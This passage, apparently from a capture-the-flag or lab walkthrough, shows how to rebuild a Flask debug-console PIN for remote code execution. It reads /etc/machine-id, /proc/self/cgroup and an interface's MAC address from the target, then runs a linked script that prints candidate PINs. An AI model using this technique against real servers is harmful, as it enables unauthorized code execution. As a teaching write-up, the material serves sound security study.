# get\_flask\_pin.py

[https://gist.githubusercontent.com/InfoSecJack/70033ecb7dde4195661a1f6ed7990d42/raw/028384ef695e376d412f9276ad27b2c916d4f748/get\_flask\_pin.py](https://gist.githubusercontent.com/InfoSecJack/70033ecb7dde4195661a1f6ed7990d42/raw/028384ef695e376d412f9276ad27b2c916d4f748/get\_flask\_pin.py)

We should be able to do this with this script, but first we need the contents of three files:&#x20;

* /etc/machine-id
* /proc/self/cgroup
* /sys/class/net/INTERFACE\_NAME/address.&#x20;

We discover the machine id in&#x20;

/etc/machine-id 00566233196142e9961b4ea12a2bdb29

/proc/self/cgroup

12:perf\_event:/ 11:freezer:/ 10:hugetlb:/ 9:rdma:/ 8:pids:/system.slice/blog.service 7:memory:/system.slice/blog.service 6:cpuset:/ 5:net\_cls,net\_prio:/ 4:devices:/system.slice/blog.service 3:blkio:/system.slice/blog.service 2:cpu,cpuacct:/system.slice/blog.service 1:name=systemd:/system.slice/blog.service 0::/system.slice/blog.service

The value to note here is blog.service.&#x20;

Finally, we need the MAC address of the network interface. Unfortunately, we do not know the name of the interface the target is using, but we can attempt a few more frequently-used names. Eventually, we detect ens160, resolving the file of interest to be /sys/class/net/ens160/address  Navigating to that address, we find the MAC address to be 00:50:56:8a:fc:e8 or 345049332968 in decimal.

Remote Code Execution Now that we have all the information needed to recreate the Flask debug PIN, we can attempt to gain remote code execution. We can recreate the PIN with a script:&#x20;

```
kali@kali:~$ python3 get_flask_pin.py --machineid '00566233196142e9961b4ea12a2bdb29blog.service' --uuid 345049332968
[!] App.py base path not provided, trying for most versions of python 
2.7: 808-636-148 
3.0: 326-388-942 
3.1: 497-064-428 
3.2: 134-262-617 
3.3: 190-791-220 
3.4: 238-677-304 
3.5: 210-728-119 
3.6: 173-509-958 
3.7: 159-262-052 
3.8: 751-326-702
```

Sometimes it can not work. We can try above command without /proc/self/cgroup value.

```
kali@kali:~$ python3 get_flask_pin.py --machineid '00566233196142e9961b4ea12a2bdb29' --uuid 345049332968
```
